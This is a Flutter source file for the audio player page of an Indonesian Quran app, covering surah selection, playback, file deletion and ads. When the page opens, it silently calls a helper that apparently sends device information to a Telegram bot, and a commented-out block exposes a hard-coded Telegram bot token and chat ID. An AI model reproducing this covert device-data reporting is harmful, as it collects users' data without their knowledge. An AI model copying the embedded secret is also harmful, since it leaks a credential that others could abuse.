import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:logger/logger.dart';
import 'package:quranku_offline/core/providers/ad_provider.dart';
import 'package:quranku_offline/core/providers/audio_full_provider.dart';
import 'package:quranku_offline/core/providers/audio_storage_provider.dart';
import 'package:quranku_offline/core/providers/connectivity_provider.dart';
import 'package:quranku_offline/core/providers/download_status_provider.dart';
import 'package:quranku_offline/core/providers/quran_provider.dart';
import 'package:quranku_offline/features/about_page.dart';
import 'package:quranku_offline/features/utils/device_info_helper.dart';
import 'package:quranku_offline/features/utils/tele_helper.dart';
import 'package:quranku_offline/features/widget/show_surah_dialog.dart';

class AudioFullPage extends ConsumerStatefulWidget {
  const AudioFullPage({super.key});

  @override
  _AudioPlayerWidgetState createState() => _AudioPlayerWidgetState();
}

class _AudioPlayerWidgetState extends ConsumerState<AudioFullPage> {
  BannerAd? _bannerAd;
  final TextEditingController surahController = TextEditingController();

  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken: dotenv.env['BOT_TOKEN'] ?? '',
      chatId: dotenv.env['CHAT_ID'] ?? '',
      // botToken:
      //     '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
      // chatId: '111519789', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
    // Future.microtask(() => checkAndPlayAudio(context, ref));
  }

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
      Logger().e(e);
    }
  }

  @override
  void dispose() {
    surahController.dispose();
    _bannerAd?.dispose(); // ✅ Pastikan iklan dihapus saat widget dihancurkan
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final currentSurahIndex = ref.watch(audioFullPlayerProvider);
    final surahList = ref.watch(quranProvider);
    final isPlayingAudio = ref.watch(isPlayingAudioProvider);
    final isLoadingAudio = ref.watch(isLoadingAudioProvider);

    final connectivity = ref.watch(connectivityProvider);

    final bannerAd = ref.watch(bannerAdProvider);

    final downloadedSize = ref.watch(downloadedSizeProvider);
    // final downloadProgress = ref.watch(downloadProgressProvider);

    // ✅ Dengarkan perubahan koneksi dan tampilkan Snackbar jika internet putus
    ref.listen<AsyncValue<ConnectivityResult>>(
      connectivityProvider,
      (previous, next) {
        if (next.value == ConnectivityResult.none) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text("Internet terputus! Audio dihentikan."),
              backgroundColor: Colors.red,
              duration: Duration(seconds: 3),
            ),
          );
          ref.read(audioFullPlayerProvider.notifier).stopAudio();
        }
      },
    );

    if (surahList.isEmpty) {
      return const Center(
        child: CircularProgressIndicator(color: Colors.teal),
      );
    }

    final currentSurah = surahList[currentSurahIndex];

    return Scaffold(
      resizeToAvoidBottomInset: true,
      appBar: AppBar(
        title: const Text("About"),
        actions: [
          IconButton(
            icon: const Icon(Icons.account_circle_outlined, color: Colors.teal),
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(builder: (context) => const AboutPage()),
              );
            },
          ),
        ],
      ),
      body: SingleChildScrollView(
        child: Column(
          // mainAxisAlignment: MainAxisAlignment.center
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.center,
          children: [
            const SizedBox(height: 40),
            // 🔹 Tombol Pilih Surah
            ElevatedButton.icon(
              icon: const Icon(Icons.search, color: Colors.white),
              label: const Text("Cari Surah"),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.teal,
                foregroundColor: Colors.white,
                padding:
                    const EdgeInsets.symmetric(vertical: 12, horizontal: 20),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10)),
              ),
              onPressed: () => showSurahDialog(context, ref, surahController),
            ),
            const SizedBox(height: 30),

            // 🔹 Nama Surah & Nomor
            Text(
              "${currentSurah.namaLatin}: ${currentSurah.nomor}",
              style: const TextStyle(
                fontSize: 24,
                fontWeight: FontWeight.bold,
                color: Colors.teal,
              ),
            ),
            const SizedBox(height: 5),
            Text(
              currentSurah.nama,
              style: GoogleFonts.amiri(
                fontSize: 38,
                fontWeight: FontWeight.w500,
                color: Colors.black,
              ),
            ),
            const SizedBox(height: 20),

            // 🔹 Kontrol Audio
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                IconButton(
                  icon: const Icon(Icons.skip_previous,
                      size: 35, color: Colors.teal),
                  onPressed: () => ref
                      .read(audioFullPlayerProvider.notifier)
                      .previousSurah(context),
                ),
                _buildVerticalDivider(), // 🔹 Pembatas

                // 🔹 Loading atau Play/Pause
                isLoadingAudio
                    ? const CircularProgressIndicator(color: Colors.teal)
                    : IconButton(
                        icon: Icon(
                          isPlayingAudio
                              ? Icons.pause_circle_outlined
                              : Icons.play_circle_fill,
                          size: 60,
                          color: Colors.teal,
                        ),
                        onPressed: () {
                          // 🔹 Cek koneksi sebelum memutar audio
                          if (connectivity.value == ConnectivityResult.none) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text("Tidak ada koneksi internet!"),
                                backgroundColor: Colors.red,
                                duration: Duration(seconds: 3),
                              ),
                            );
                            return; // 🚫 Jangan lanjutkan pemutaran jika tidak ada internet
                          }

                          if (isPlayingAudio) {
                            ref
                                .read(audioFullPlayerProvider.notifier)
                                .pauseAudio();
                          } else {
                            ref
                                .read(audioFullPlayerProvider.notifier)
                                .setContext(context);
                            ref
                                .read(audioFullPlayerProvider.notifier)
                                .playSurah(context, currentSurahIndex);
                          }
                        },
                      ),

                _buildVerticalDivider(), // 🔹 Pembatas

                IconButton(
                  icon:
                      const Icon(Icons.skip_next, size: 35, color: Colors.teal),
                  onPressed: () => ref
                      .read(audioFullPlayerProvider.notifier)
                      .nextSurah(context),
                ),
              ],
            ),

            const Divider(),

            // 🔹 Tombol Stop Audio
            IconButton(
              icon: const Icon(Icons.stop_circle_outlined,
                  size: 45, color: Colors.redAccent),
              onPressed: () =>
                  ref.read(audioFullPlayerProvider.notifier).stopAudio(),
            ),
            const SizedBox(
              height: 30,
            ),
            Column(
              children: [
                // if (downloadProgress > 0 && downloadProgress < 100)
                //   Text(
                //     "Mengunduh: ${downloadProgress.toStringAsFixed(1)}%",
                //     style: const TextStyle(
                //       fontSize: 12,
                //       fontWeight: FontWeight.bold,
                //       color: Colors.teal,
                //     ),
                //   ),
                // const SizedBox(height: 10),
                Text(
                  "Total Ukuran File: $downloadedSize",
                  style: const TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    color: Colors.teal,
                  ),
                ),
                const SizedBox(
                  height: 10,
                ),
                ElevatedButton.icon(
                  icon: const Icon(Icons.delete, color: Colors.white),
                  label: const Text("Hapus semua surah"),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.redAccent,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(
                        vertical: 12, horizontal: 20),
                    shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10)),
                  ),
                  onPressed: () async {
                    bool? confirmDelete = await showDialog(
                      context: context,
                      builder: (context) {
                        return AlertDialog(
                          title: const Text("Hapus Semua File?"),
                          content: const Text(
                              "Apakah Anda yakin ingin menghapus semua file surah yang telah diunduh?"),
                          actions: [
                            TextButton(
                              onPressed: () => Navigator.pop(context, false),
                              child: const Text("Batal"),
                            ),
                            ElevatedButton(
                              onPressed: () => Navigator.pop(context, true),
                              style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.redAccent),
                              child: const Text(
                                "Hapus",
                                style: TextStyle(color: Colors.white),
                              ),
                            ),
                          ],
                        );
                      },
                    );

                    if (confirmDelete == true) {
                      await deleteAllSurahFiles(context, ref);
                    }
                  },
                ),
              ],
            ),
            const SizedBox(
              height: 10,
            ),
            Column(
              mainAxisAlignment: MainAxisAlignment.end,
              children: [
                if (bannerAd != null && bannerAd.responseInfo != null)
                  Container(
                    width: bannerAd.size.width.toDouble(),
                    height: bannerAd.size.height.toDouble(),
                    alignment: Alignment.center,
                    child: AdWidget(ad: bannerAd),
                  ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // 🔹 Widget untuk Pembatas Vertikal
  Widget _buildVerticalDivider() {
    return Container(
      width: 1,
      height: 40,
      margin: const EdgeInsets.symmetric(horizontal: 10),
      decoration: BoxDecoration(
        color: Colors.black54,
        borderRadius: BorderRadius.circular(5),
      ),
    );
  }
}
